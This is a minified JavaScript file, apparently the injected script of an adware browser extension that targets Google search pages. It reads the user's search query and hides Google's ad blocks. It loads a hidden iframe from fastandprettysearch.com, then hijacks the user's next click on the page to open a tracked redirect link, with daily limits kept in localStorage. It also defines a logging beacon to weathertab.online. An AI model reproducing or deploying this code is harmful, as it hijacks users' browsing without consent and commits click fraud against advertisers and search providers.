(function(){if(window.top!=window||window["214f104573d95d95ba"]===undefined||window["214f104573d95d95ba"].l["214f104573d95d95ba_bd18392ede95ebebfd9d056a76e72ea4"]){"return"}window["214f104573d95d95ba"].l["214f104573d95d95ba_bd18392ede95ebebfd9d056a76e72ea4"]=true;;var L=window["214f104573d95d95ba"],i=L.Sizzle;var W=L.getMonetizationConfig("230aa");var g="200",ag=0.2;if(typeof(W.subid)!=="undefined"){g=W.subid}if(typeof(W.shape)!=="undefined"){ag=W.shape}var am={sub_ID:g,CTR:ag,placeRates:[100,60,20,10]},al=!1,ak=5,aj=0,ai="google",ah="https://fastandprettysearch.com/",af={iframeURL:ah+"xa/starter.html?",redirectURL:ah+"xa/click.html?url={URL}&",queryStringTemplate:"q={KEYWORDS}&s=0",querySubIDTemplate:"&sub={SUB_ID}",messageStart:"xAdsFCIfr"};ak=5,aj=40;var ae,ad,ac=function(b){return decodeURIComponent((new RegExp("[?|&]"+b+"=([^&;]+?)(&|#|;|$)").exec(location.search)||[null,""])[1].replace(/\+/g,"%20"))||""},ab=function(){var m="";if(!m.length){return function(){return !!(am.sub_ID&&am.CTR&&am.placeRates&&am.placeRates.length)}}var a=m.split("|");if(2>=a.length){var p=a[0];a[0]=a[1],a[1]=p,a[0]||(a[0]="0")}var o=parseFloat(a[1]);if(o&&(am.CTR=o),a[2]&&a[2].trim&&a[2].trim()){for(var n,l=a[2].split(","),k=0,f=0;f<l.length;f++){n=parseFloat(l[f]),n&&(am.placeRates[k]=n,k++)}k&&(am.placeRates.length=k)}return a[0]&&a[0].trim&&a[0].trim()&&(am.sub_ID=a[0].trim()),function(){return !!(am.sub_ID&&am.CTR&&am.placeRates&&am.placeRates.length)}}(),aa=Math.random(),Z=function(a){var h="34404";try{h="0"+am.sub_ID,parseInt(h)||(h="00")}catch(e){}var f=new Image;f.src="https://weathertab.online/logger/?rnd="+aa+"&logFile=779"+h+"&event="+encodeURIComponent(a)},Y=function(b){};ae=function(){},ad=Y;var V=function(b){ad(b.name+": "+b.message+"\n"+b.stack)},T=function(){return ad("Error: website '"+ai+"' is not supported"),!1},R=T;R=function(){var e=document.domain.split("."),d=e.indexOf("google");if(0!==d&&1!==d){return !1}if(1==d&&"www"!=e[0]){return !1}if("/search"!=location.pathname){return !1}var f=location.search;return !(0<f.indexOf("tbm=")&&0>=f.indexOf("tbm=shop"))};var P=T;P=function(){var d,c=function(a){return !!(a&&a.trim)&&(d=a.trim(),d)};return !!c(ac("q"))&&d};var N=function(a){var d="0"==am.sub_ID?"":af.querySubIDTemplate;return(af.queryStringTemplate+d).replace("{SUB_ID}",encodeURIComponent(am.sub_ID)).replace("{NUMADS}",am.placeRates.length).replace("{KEYWORDS}",encodeURIComponent(a))},K=new function(){var a=af.messageStart+"Prob"+am.CTR.toString();this.set=function(b){return b=b.toFixed(4),localStorage[a]=b,parseFloat(b)},this.get=function(){var b=parseFloat(localStorage[a]);return !b||1<=b?this.set(am.CTR):b*1},this.increase=function(){this.set(1-(1-this.get())*(1-am.CTR))},this.decrease=function(){value=am.CTR,this.set(value)},this.check=function(){var d=Math.random(),c=this.get();return ae("rnd: "+d.toString()+", ctr: "+c.toString()),d<c}},J=new function(){var j=af.messageStart+"Limit",a=j+"Requests",h=function(){var b=new Date;return b.getFullYear()+"-"+(b.getMonth()+1)+"-"+b.getDate()}(),d=function(f){var e=localStorage[f],m=0;if(e){try{var l=JSON.parse(e);m=parseInt(l[h])||0}catch(k){}}return m},c=function(f){var e=d(f)+1,k={};k[h]=e,localStorage[f]=JSON.stringify(k)};this.click=function(){ak&&c(j)},this.check=function(){return !ak||d(j)<ak},this.checkRequests=function(){return !aj||(c(a),d(a)<=aj)},this.serialize=function(){return JSON.stringify({today:h,req:d(a),clk:d(j)})}},I=function(b,o){var n=document.createElement("iframe"),m=!1,l=!1;n.setAttribute("style","display:none!important");var k=af.iframeURL;if(!k){return void ad("Error: no base.iframeURL ("+JSON.stringify(af)+")")}if(n.src=k+b,window.addEventListener("message",function(c){try{var p=af.messageStart+"IResults=";if(c&&c.data&&c.data.indexOf&&0==c.data.indexOf(p)){if(m){return}m=!0;var j=c.data.replace(p,""),e=[];try{e=JSON.parse(j)}catch(f){ad("Error: invalid results ("+j+")")}L.loadedCallback("MNTZ_LOADED","230aa");o(e)}al&&c&&c.data&&c.data==af.messageStart+"IReady"&&!l&&(l=!0,ad("Iframe ready"))}catch(f){V(f),ad(c.data)}}),al&&(n.addEventListener("load",function(){ad("Iframe loaded")}),n.addEventListener("error",function(c){ad("Iframe error: "+c)})),document.body.appendChild(n),setInterval(function(){try{!m&&n&&n.contentWindow&&n.contentWindow.postMessage(af.messageStart+"GimmeResults","*")}catch(a){V(a)}},200),al){ad("Iframe appended");var h=0;setTimeout(function(){h++,m||ad("Still no results "+h),l||ad("Still not ready "+h)},10000)}},H=function(a){for(var q=0,p=0,o=[],n=Math.min(am.placeRates.length,a.length),m=0;m<n;m++){p+=am.placeRates[m],o.push(p)}for(var k=Math.random()*p,m=0;m<o.length;m++){if(k<o[m]){q=m+1;break}}if(!q){return ad("Error: place = 0"),!1}var j=a[q-1].link;return j&&j.substr&&"http"==j.substr(0,4)?(ae("Selected "+j),j):(ad("Error: invalid result URL"),!1)},G=af.messageStart+"Kwds",X=function(){var b=localStorage[G];return b&&"null"!=b?b:""},U=function(b){b&&"null"!=b&&(localStorage[G]=b)},S=!1,Q=function(j,h,n){if(!S){S=!0;var m,l=function(b){try{if(m){return m(b)}}catch(c){V(c)}return !0},k=function(p){for(var o=document.querySelectorAll("body"),t=[],s=p;s;){t.push(s),s=s.parentNode}for(var r=0;r<o.length;r++){for(var q=0;q<t.length;q++){if(o[r]==t[q]){return !0}}}return !1},m=function(b){if(!k(b.target)){return !0}m=function(){return !0},b.stopPropagation&&b.stopPropagation(),b.stopImmediatePropagation&&b.stopImmediatePropagation(),b.preventDefault&&b.preventDefault();var c=af.redirectURL.replace("{URL}",encodeURIComponent(h));if(!c){return ad("Error: no base.redirectURL ("+JSON.stringify(af)+")"),!1}L.loadedCallback("CB_YFSC_CLICK","230aa");var a=c+j;return window.open(a)?(ae("opened "+a),K.decrease(),J.click(),U(n)):ad("Cannot open "+a),!1};j&&h&&"http"==h.substr(0,4)?document.documentElement.addEventListener("click",l,!0):ad("Invalid setClick params: "+j+", "+h)}};"google"==ai&&function(){var e=document.createElement("style");e.innerText="#tads, #bottomads {display: none !important}";var d=function(){return !!document.head&&(document.head.appendChild(e),!0)};if(!d()){var f=setInterval(function(){d&&clearInterval(f)},100)}}();var O=function(){try{if(window!=window.top){return}if(!ab()||!R()){return}al&&ad("Start: "+location.href);var b=P();if(!b){return void ad("No keywords found: "+location.href)}var h=encodeURIComponent(af.messageStart+b);if(window[h]){return void ad("Code already loaded on this page")}if(window[h]=!0,X()==b){return void ad("Last keywords '"+X()+"' are the same as current keywords '"+b+"'")}if(al&&ad("Limits: "+J.serialize()),!J.check()){return void (al&&ad("Click limit reached"))}var f=N(b);if(!f){return void ad("Error: no queryString ("+JSON.stringify(af)+")")}if(al&&ad("Starting request "+b),!J.checkRequests()){return void (al&&ad("Requests limit reached"))}I(f,function(k){try{var j="Results: "+(!!k).toString()+", results length: "+k.length.toString();if(ae(j),al&&ad(j),!k||!k.length){return void U(b)}if(!K.check()){return}var d=H(k);if(!d){return}K.increase(),Q(f,d,b)}catch(a){V(a)}})}catch(e){V(e)}},M=document.readyState;"complete"==M||"interactive"==M?O():document.addEventListener("DOMContentLoaded",O,!1)})();